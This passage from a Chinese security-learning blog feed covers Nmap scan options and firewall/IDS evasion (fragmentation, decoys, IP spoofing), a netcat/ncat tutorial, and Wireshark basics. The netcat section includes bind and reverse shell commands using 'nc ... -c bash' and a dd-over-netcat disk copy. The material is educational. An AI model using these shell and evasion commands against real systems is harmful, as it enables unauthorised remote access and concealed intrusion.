operator">-</span>PE<span class="token operator">/</span>PP<span class="token operator">/</span>PM:使用ICMPecho<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> and netmask 请求包发现主机。<span class="token operator">-</span>PO<span class="token namespace">[protocollist]</span>:使用IP协议包探测对方主机是否开启。<span class="token operator">-</span>n/<span class="token operator">-</span>R:<span class="token operator">-</span>n表示不进行DNS解析；<span class="token operator">-</span>R表示总是进行DNS解析。<span class="token operator">--</span>dns<span class="token operator">-</span>servers&lt;serv1<span class="token punctuation">[</span><span class="token punctuation">,</span>serv2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>>: 指定DNS服务器。<span class="token operator">--</span>system<span class="token operator">-</span>dns:指定使用系统的DNS服务器<span class="token operator">--</span>traceroute:追踪每个路由节点</code></pre><p>18、端口扫描详细参数</p><pre class="language-bash" data-language="bash"><code class="language-bash">TCP FIN/Xmas/NULL扫描。这三种扫描方式被称为秘密扫描（Stealthy Scan），因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN包或Xmas tree包/Null包，如果收到对方RST回复包，那么说明该端口是关闭的；没有收到RST包说明端口可能是开放的或被屏蔽的（open<span class="token operator">|</span>filtered）。</code></pre><p>其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有flags都为0的TCP包。</p><pre class="language-bash" data-language="bash"><code class="language-bash">-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect<span class="token punctuation">(</span><span class="token punctuation">)</span>/ACK/Window/Maimonscans的方式来对目标主机进行扫描。</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。--scanflags <span class="token operator">&lt;</span>flags<span class="token operator">></span>: 定制TCP包的flags。-sI <span class="token operator">&lt;</span>zombiehost<span class="token punctuation">[</span>:probeport<span class="token punctuation">]</span><span class="token operator">></span>: 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。-sO: 使用IP protocol 扫描确定目标机支持的协议类型。-b <span class="token operator">&lt;</span>FTP relay host<span class="token operator">></span>: 使用FTP bouncescan扫描方式</code></pre><p>19、版本检测详细参数</p><pre class="language-bash" data-language="bash"><code class="language-bash">-sV:指定让Nmap进行版本侦测--version-intensity<span class="token operator">&lt;</span>level<span class="token operator">></span>: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。--version-light:指定使用轻量侦测方式 <span class="token punctuation">(</span>intensity <span class="token number">2</span><span class="token punctuation">)</span>--version-all:尝试使用所有的probes进行侦测 <span class="token punctuation">(</span>intensity <span class="token number">9</span><span class="token punctuation">)</span>--version-trace:显示出详细的版本侦测过程信息。</code></pre><p>20、规避检测</p><pre class="language-bash" data-language="bash"><code class="language-bash">现在防火墙和IDS的检测能力也并非没有长进，为了防止被检测出来，我们需要完整的规避检测的方案。</code></pre><p>20.1 分片（Fragmentation）</p><p>将可疑的探测包进行分片处理（例如将TCP包拆分成多个IP包发送过去），某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查。</p><p>20.2 IP诱骗（IP decoys）</p><p>在进行扫描时，将真实IP地址和其他主机的IP地址（其他主机需要在线，否则目标主机将回复大量数据包到不存在的主机，从而实质构成了拒绝服务攻击）混合使用，以此让目标主机的防火墙或IDS追踪检查大量的不同IP地址的数据包，降低其追查到自身的概率。注意，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实IP地址。</p><p>20.3 IP伪装（IP Spoofing）</p><p>顾名思义，IP伪装即将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机在与之通信。需要注意，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan或匿名代理（如TOR）等网络技术。</p><p>20.4 指定源端口</p><p>某些目标主机只允许来自特定端口的数据包通过防火墙。例如FTP服务器配置为：允许源端口为21号的TCP包通过防火墙与FTP服务端通信，但是源端口为其他端口的数据包被屏蔽。所以，在此类情况下，可以指定Nmap将发送的数据包的源端口都设置特定的端口。</p><p>20.5 扫描延时</p><p>某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率（例如，Solaris 系统通常会限制每秒钟只能产生一个ICMP消息回复给UDP扫描），所以，定制该情况下发包的频率和发包延时可以降低目标主机的审查强度、节省网络带宽。</p><p>20.6 其他技术</p><p>Nmap 还提供多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的 MTU、指定TTL、指定伪装的MAC地址、使用错误检查和（badchecksum）。</p><pre class="language-bash" data-language="bash"><code class="language-bash">-f<span class="token punctuation">;</span>--mtu <span class="token operator">&lt;</span>val<span class="token operator">></span>: 指定使用分片、指定数据包的MTU.-D<span class="token operator">&lt;</span>decoy1,decoy2<span class="token punctuation">[</span>,ME<span class="token punctuation">]</span>,<span class="token punctuation">..</span>.<span class="token operator">></span>: 用一组IP地址掩盖真实地址，其中ME填入自己的IP地址。-S<span class="token operator">&lt;</span>IP_Address<span class="token operator">></span>: 伪装成其他IP地址-e<span class="token operator">&lt;</span>iface<span class="token operator">></span>: 使用特定的网络接口-g/--source-port<span class="token operator">&lt;</span>portnum<span class="token operator">></span>: 使用指定源端口--data-length<span class="token operator">&lt;</span>num<span class="token operator">></span>: 填充随机数据让数据包长度达到Num。--ip-options<span class="token operator">&lt;</span>options<span class="token operator">></span>: 使用指定的IP选项来发送数据包。--ttl<span class="token operator">&lt;</span>val<span class="token operator">></span>: 设置time-to-live时间。--spoof-mac<span class="token operator">&lt;</span>mac address/prefix/vendor name<span class="token operator">></span>: 伪装MAC地址--badsum:使用错误的checksum来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或IDS/IPS）。</code></pre><p>22、定制数据包</p><p>Nmap 提供–scanflags 选项，用户可以对需要发送的TCP探测包的标志位进行完全的控制。可以使用数字或符号指定TCP标志位：URG, ACK, PSH,RST, SYN,and FIN。</p><pre class="language-bash" data-language="bash"><code class="language-bash">另外使用--ip-options可以定制IP包的options字段。使用-S指定虚假的IP地址，-D指定一组诱骗IP地址（ME代表真实地址）。-e指定发送探测包的网络接口，-g（--source-port）指定源端口，-f指定使用IP分片方式发送探测包，--spoof-mac指定使用欺骗的MAC地址。--ttl指定生存时间。</code></pre><p>23、扫描路由器</p><p>Nmap 内部维护了一份系统与设备的数据库（nmap-os-db），能够识别数千种不同系统与设备。所以，可以用来扫描主流的路由器设备。</p><p>23.1扫描路由器TFTP</p><pre class="language-bash" data-language="bash"><code class="language-bash">示例：nmap –sU–p <span class="token number">69</span> –nvv target</code></pre><p>大多数的路由器都支持TFTP协议（简单文件传输协议），该协议常用于备份和恢复路由器的配置文件，运行在UDP 69端口上。使用上述命令可以探测出路由器是否开放TFTP。</p><p>23.2扫描路由器操作系统</p><p>与通用PC扫描方式类似，使用-O选项扫描路由器的操作系统。-F用于快速扫描最可能开放的100个端口，并根据端口扫描结果进一步做OS的指纹分析。</p><pre class="language-bash" data-language="bash"><code class="language-bash">示例：nmap -O -F -n <span class="token number">192.168</span>.1.1</code></pre><p>24、扫描Web站点</p><p>Web是互联网上最广泛的应用，而且越来越多的服务倾向于以Web形式提供出来，所以对Web安全监管也越来越重要。目前安全领域有很多专门的Web扫描软件（如AppScan、WebInspect、W3AF），能够提供端口扫描、漏洞扫描、漏洞利用、分析报表等诸多功能。而Nmap作为一款开源的端口扫描器，对Web扫描方面支持也越来越强大，可以完成Web基本的信息探测：服务器版本、支持的Method、是否包含典型漏洞。功能已经远远超过同领域的其他开源软件，如HTTPrint、Httsquash。</p><p>目前Nmap中对Web的支持主要通过Lua脚本来实现，NSE脚本库中共有50多个HTTP相关的脚本。</p><pre class="language-none"><code class="language-none">示例：nmap -sV -p 80 -T4 --scripthttp*,defaultscanme.nmap.org</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali神器之实用工具的基本使用</title>
      <link href="/posts/c658dfdf/"/>
      <url>/posts/c658dfdf/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始进行kali linux学习（修仙ing）</p><p>本文主要目标是基本工具的了解与使用。</p><h1 id="NETCAT——NC"><a href="#NETCAT——NC" class="headerlink" title="NETCAT——NC"></a>NETCAT——NC</h1><ul><li>网络工具中的瑞士军刀——小身材，大智慧。</li><li>侦听模式/传输模式</li><li>telnet / 获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘<h2 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET/BANNER"></a>NC——TELNET/BANNER</h2>获取banner信息<pre class="language-powershell" data-language="powershell"><code class="language-powershell">nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 110 <span class="token operator">/</span><span class="token operator">/</span>pop3服务nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 25  <span class="token operator">/</span><span class="token operator">/</span>smtp服务nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 80  <span class="token operator">/</span><span class="token operator">/</span>http服务</code></pre>关于获取banner信息还有许多其他的工具可以利用，比如nmap还有dmitry都是kali自带的工具，都可以进行banner信息的获取。不一一举例。<br>通过<code>nc -h</code>查看功能<br><img src="https://img-blog.csdnimg.cn/20200525122525586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><h2 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h2>这个功能可以用来连接两台主机。进行聊天对话沟通。</li></ul><pre class="language-powershell" data-language="powershell"><code class="language-powershell">A: nc <span class="token operator">-</span>l <span class="token operator">-</span>p 4444B: nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 4444</code></pre><p>第一台主机代表服务端需要先侦听一个端口，使用第一条命令，<code>-l</code>代表listen，也就是听的意思，<code>-p</code>指的是端口，意思就是告诉nc我想要侦听4444端口。<br>第二台主机代表客户端，使用nc连接服务端的这个端口，就可以进行聊天。前提条件是，<strong>客户端必须知道服务端开启的端口和IP地址。</strong><br>连接状态一方终止两边都会终止。</p><h2 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h2><h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><pre class="language-powershell" data-language="powershell"><code class="language-powershell">A: nc <span class="token operator">-</span><span class="token function">lp</span> 333 > 1<span class="token punctuation">.</span>mp4     <span class="token comment">#接收端</span>B: nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333 &lt; 1<span class="token punctuation">.</span>mp4 <span class="token operator">-</span>q 1    <span class="token comment">#发送端</span></code></pre><p>接收端表示侦听一个333端口，并将接受的文件输出到1.MP4文件。<br>发送端表示nc连接输入文件进行发送。<code>-q 1</code>表示如果传送结束1秒后自动退出服务。(文件比较大的话可以使用这个比较方便)<br>简单来说就是A开启服务后，等待着B来给他发送文件。<br>或者使用这样的方式传输文件</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">A: nc <span class="token operator">-</span>q 1 <span class="token operator">-</span><span class="token function">lp</span> 333 &lt; a<span class="token punctuation">.</span>mp4B: nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333 > 2<span class="token punctuation">.</span>mp4</code></pre><p>A作为发送端，先将服务开启，然后B进行连接，一旦连接成功，就会进行传输，完成后一秒关闭连接。<br>这个是A开启服务后，准备一个文件，然后等待B来连接它并接收这个文件。<br>以上是两种传输方式，可以A传输给B也可以B传输给A。</p><h3 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h3><p>目录的传输也可以双向传输，与上述文件传输类似。下面只写一个方向。<br>可以使用以下命令</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">A: tar <span class="token operator">-</span>cvf <span class="token operator">-</span>music<span class="token operator">/</span> <span class="token punctuation">|</span> nc <span class="token operator">-</span><span class="token function">lp</span> 333 <span class="token operator">-</span>q 1B: nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333 <span class="token punctuation">|</span> tar <span class="token operator">-</span>xvf <span class="token operator">-</span></code></pre><p><code>cvf</code>是将文件打包的作用，然后将打包后的文件灌输到管道中，使用nc进行传输。等待B连接。<br>B连接后接收到来自A端的文件，使用<code>xvf</code>解压tar包。还原成目录。</p><h3 id="加密传输文件"><a href="#加密传输文件" class="headerlink" title="加密传输文件"></a>加密传输文件</h3><p>使用命令</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">A: mcrypt <span class="token operator">--</span>flush <span class="token operator">-</span>Fbq <span class="token operator">-</span>a rijndael<span class="token operator">-</span>256 <span class="token operator">-</span>m ecb &lt; a<span class="token punctuation">.</span>mp4 <span class="token punctuation">|</span> nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333 <span class="token operator">-</span>q 1B: nc <span class="token operator">-</span><span class="token function">lp</span> 333 <span class="token punctuation">|</span> mcrypt <span class="token operator">--</span>flush <span class="token operator">-</span>Fbqd <span class="token operator">-</span>a rijndael<span class="token operator">-</span>256 <span class="token operator">-</span>m ecb > 1<span class="token punctuation">.</span>mp4</code></pre><p>这个是不用记的，毕竟这么长。<br>输入完整命令后，在A端也就是发送端会提示让输入密码(自己设置)，设置密码后，再次进行输入(密码不显示，直接输入就行)。<br>在B端进行连接就会提示输入密码。这个密码就是A端设置的密码。输入正确就就可以接收。<br><strong>注</strong>:这个加密并不是nc自带的加密方式。而是利用了另一个程序的功能。这个程序名叫mcrypt，这个kali里面没有自带，需要自行安装。<br>安装方法直接用apt-get包管理器就行。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">apt<span class="token operator">-</span>get install mcrypt <span class="token operator">-</span>y</code></pre><h2 id="NC——流媒体服务器"><a href="#NC——流媒体服务器" class="headerlink" title="NC——流媒体服务器"></a>NC——流媒体服务器</h2><p>使用命令</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">A: <span class="token function">cat</span> 1<span class="token punctuation">.</span>mp4 <span class="token punctuation">|</span> nc <span class="token operator">-</span><span class="token function">lp</span> 333     <span class="token comment"># 服务端</span>B: nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333 <span class="token punctuation">|</span> mplayer <span class="token operator">-</span>vo x11 <span class="token operator">-</span>cache 3000<span class="token operator">-</span>      <span class="token comment"># 客户端</span></code></pre><p>cat是查看文本信息的，这里也可以用来查看1.MP4的信息<br>mplayer是一个媒体播放应用。<br>cache 3000  表示缓存大小。</p><h2 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h2><p>端口扫描有好多工具可以使用。比如：nmap、Dmitry、netcat(也就是nc)，这些都是kali当中自带的工具。<br>这里主要介绍学习nc<br>其他的后续可能会写。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">nc <span class="token operator">-</span>nvz IP地址 端口范围如：nc <span class="token operator">-</span>nvz 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>40<span class="token punctuation">.</span>138 1<span class="token operator">-</span>5000</code></pre><h2 id="NC——远程克隆硬盘"><a href="#NC——远程克隆硬盘" class="headerlink" title="NC——远程克隆硬盘"></a>NC——远程克隆硬盘</h2><pre class="language-powershell" data-language="powershell"><code class="language-powershell">A: nc <span class="token operator">-</span><span class="token function">lp</span> 333 <span class="token punctuation">|</span> dd of=<span class="token operator">/</span>dev<span class="token operator">/</span>sda   <span class="token comment">#接收方</span>B: dd <span class="token keyword">if</span>=<span class="token operator">/</span>dev<span class="token operator">/</span>sda <span class="token punctuation">|</span> nc <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333 <span class="token operator">-</span>q 1   <span class="token comment">#这里B相当于被取证的电脑</span></code></pre><ul><li>远程电子取证，可以将目标服务器硬盘远程复制或者内存。<br>if相当于inputfile(输入)<br>of相当于outputfile(输出)<h2 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h2><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#正向</span>A: nc <span class="token operator">-</span><span class="token function">lp</span> 333 <span class="token operator">-</span>c bash  <span class="token comment">#服务器端</span>B: nc 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333      <span class="token comment">#客户端</span><span class="token comment">#反向</span>A: nc <span class="token operator">-</span><span class="token function">lp</span> 333           <span class="token comment">#客户端</span>B: nc 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333 <span class="token operator">-</span>c bash    <span class="token comment">#服务器端</span></code></pre>这里利用shell使得用nc连接的用户可以进行远程控制<br>bash是linux系统自带的shell。</li></ul><p><strong>注</strong>：windows用户把bash改成cmd</p><h2 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h2><ul><li>Nc缺乏加密和身份验证的能力。</li><li>Ncat包含于nmap工具包中<br>使用方法<br>依旧是A和B两台机器实验<pre class="language-powershell" data-language="powershell"><code class="language-powershell">A: ncat <span class="token operator">-</span>c bash <span class="token operator">-</span>allow 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>20<span class="token punctuation">.</span>14 <span class="token operator">-</span>vnl 333 <span class="token operator">-</span>sslB: ncat <span class="token operator">-</span><span class="token function">nv</span> 1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 333 <span class="token operator">-</span>ssl</code></pre>参数说明：<br>A：首先ncat需要给出一个bash(本地shell)，然后<code>-allow</code>允许，后面加一个IP地址，是服务器端只允许指定的IP访问或连接。并且侦听一个端口333<br>B：直接连接就行<br>连接成功后服务器端会显示<code>Ncat：Connection from [ip] [port]</code><br>其实过程中两台主机已经进行了SSL证书验证和指纹识别。<br>这个时候使用无论输入什么命令或者传输什么信息，都是经过加密的。这里两台主机传输信息的管道就是加密的。<br>SSL加密有一定的安全性保障，每次使用，它的指纹信息都是重新生成的。<br>不同系统/平台的nc参数功能不一定相同。比如Ubuntu的和kali的就不一样。<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1>这个工具应该都了解，渗透工具排行榜第一。(突然想到了小说)<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3>打开后回看到这样的(windows系统中)<br><img src="https://img-blog.csdnimg.cn/20200526082306698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>选择一个进行扑捉流量数据，抓包的时候选择具体要抓哪个网卡的数据包。<br>如果这样还找不到自己想抓的包是哪个的话，就将鼠标移动到过滤器上，就能看到它的IP。<h3 id="抓包-停止抓包"><a href="#抓包-停止抓包" class="headerlink" title="抓包/停止抓包"></a>抓包/停止抓包</h3>kali当中的wireshark<br><img src="https://img-blog.csdnimg.cn/20200526083301678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>emmmm刚打开可能会需要输入密码，将kali的用户密码输进去就行了。(我用的是普通用户登录)可能root用户不用，看情况自定。<br>上图中箭头指的地方就是以太网。双击即可进行抓包。<br><img src="https://img-blog.csdnimg.cn/20200526083550211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>点击这里停止抓包。<br>下一步，点击这里会出现可以选择的只抓取哪个特定的端口或服务。<br><img src="https://img-blog.csdnimg.cn/20200526084256402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><h3 id="筛选抓取服务"><a href="#筛选抓取服务" class="headerlink" title="筛选抓取服务"></a>筛选抓取服务</h3>比如只抓80端口的数据。<br>还可以输入指定IP来抓取数据包。<br><img src="https://img-blog.csdnimg.cn/20200526085130481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><h3 id="首选项设置"><a href="#首选项设置" class="headerlink" title="首选项设置"></a>首选项设置</h3><img src="https://img-blog.csdnimg.cn/20200526111625759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>不过我不想设置，懒。整那么多花里胡哨的做什么。<h2 id="Wireshark——筛选器"><a href="#Wireshark——筛选器" class="headerlink" title="Wireshark——筛选器"></a>Wireshark——筛选器</h2></li><li>过滤掉干扰的数据包</li><li>抓包筛选器</li><li>显示筛选器<br>筛选IP<br><img src="https://img-blog.csdnimg.cn/20200526130240579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>就可以筛选目标IP的数据包。只看IP为目标IP的数据。<h2 id="Wireshark——常见协议包"><a href="#Wireshark——常见协议包" class="headerlink" title="Wireshark——常见协议包"></a>Wireshark——常见协议包</h2></li><li>数据包的分层结构</li><li>Arp</li><li>lcmp</li><li>TCP——三次握手</li><li>UDP</li><li>DNS</li><li>http</li><li>FTP<h2 id="Wireshark——信息统计"><a href="#Wireshark——信息统计" class="headerlink" title="Wireshark——信息统计"></a>Wireshark——信息统计</h2></li><li>节点数</li><li>协议分布</li><li>包大小分布</li><li>会话连接</li><li>解码方式</li></ul><p>这些功能基本都在统计里面,没有汉化的版本，名字叫Statistics<br><img src="https://img-blog.csdnimg.cn/20200526163439161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><ul><li>捕获文件属性（Summary）<br><img src="https://img-blog.csdnimg.cn/2020052616452820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看到捕捉的接口，还有一共抓了多少包，包的大小等等一系列信息。</li><li>通过端点(Endpoints)<br><img src="https://img-blog.csdnimg.cn/20200526165118298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看ipv4，或者TCP和UDP的信息，可以看出一共是几个IP地址在通信。<br>通过点击Bytes可以按照字节数进行排序<br><img src="https://img-blog.csdnimg.cn/20200526165531899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查找信息更加方便。可以查看哪些IP地址接收或者发送的数据包是最多的，以便了解到当前网络的数据包的发送与接收的情况。</li><li>协议分级<br><img src="https://img-blog.csdnimg.cn/20200526170010744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看出当前为止我抓的数据包都是什么协议的，哪些协议占的比例多，一目了然。</li><li>分组长度<br><img src="https://img-blog.csdnimg.cn/20200526170336925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>通过统计包的长度可以看出当前抓取的数据包是打包居多还是小包居多。<br>小包较多或者说大量的小包可能会造成网络的性能不好，还有很多攻击类型会使用小包来攻击，很有可能意味着某种攻击正在发生。</li><li>会话<br><img src="https://img-blog.csdnimg.cn/20200526170659618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>哪两个IP在进行对话，在这里可以看到，并且还有发包和接收包的大小，是A发送给B还是B发送给A都可以清楚的看到。</li><li>解码方式<br><img src="https://img-blog.csdnimg.cn/20200526171925695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>在应当进行解码的位置，右键单击，找到解码为，然后就可以解码为其他的协议。<br>点击这里进行选择更改<br><img src="https://img-blog.csdnimg.cn/20200526172207900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>wireshark的初步学习到此，以后慢慢实践。<br>文末寄语：</li></ul><blockquote><p>我们知道他们在演戏，他们也知道自己在演戏，他们也知道我们知道他们在演戏，我们也知道他们知道我们知道他们在演戏。——佚名</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali linux在虚拟机中安装教程(2020最新)+Owasp靶机搭建+vmware虚拟机出现的一些问题</title>
      <link href="/posts/94ad4e0f/"/>
      <url>/posts/94ad4e0f/</url>
      
        <content type="html"><![CDATA[<p>至于这些是什么就不多说了，来找教程的，肯定也清楚它们是什么，安装就跟着我的步骤一步一步来，我会尽量每一步都写到。</p><h2 id="声明：如果到有坑的地方，我会尽量标的明显一点。请仔细看教程，因为我就因为没有仔细看教程而踩坑了，然后就是，因为网上的各大博客网站我都看过了，都是相对于现在的官网更新的kali有些许出入。请仔细看教程，望少踩坑！！！"><a href="#声明：如果到有坑的地方，我会尽量标的明显一点。请仔细看教程，因为我就因为没有仔细看教程而踩坑了，然后就是，因为网上的各大博客网站我都看过了，都是相对于现在的官网更新的kali有些许出入。请仔细看教程，望少踩坑！！！" class="headerlink" title="声明：如果到有坑的地方，我会尽量标的明显一点。请仔细看教程，因为我就因为没有仔细看教程而踩坑了，然后就是，因为网上的各大博客网站我都看过了，都是相对于现在的官网更新的kali有些许出入。请仔细看教程，望少踩坑！！！"></a>声明：如果到有坑的地方，我会尽量标的明显一点。请仔细看教程，因为我就因为没有仔细看教程而踩坑了，然后就是，因为网上的各大博客网站我都看过了，都是相对于现在的官网更新的kali有些许出入。请仔细看教程，望少踩坑！！！</h2><p>搭建环境：VMware  workstation 15.5 pro ;Windows（搭建虚拟机的应该用的都是win10.）<br>**<em>kali**</em><br>镜像直接官网下载就行，下载地址如下：<br>kali:<a href="https://www.kali.org/">kali官网</a><br><img src="https://img-blog.csdnimg.cn/2020031921212189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" 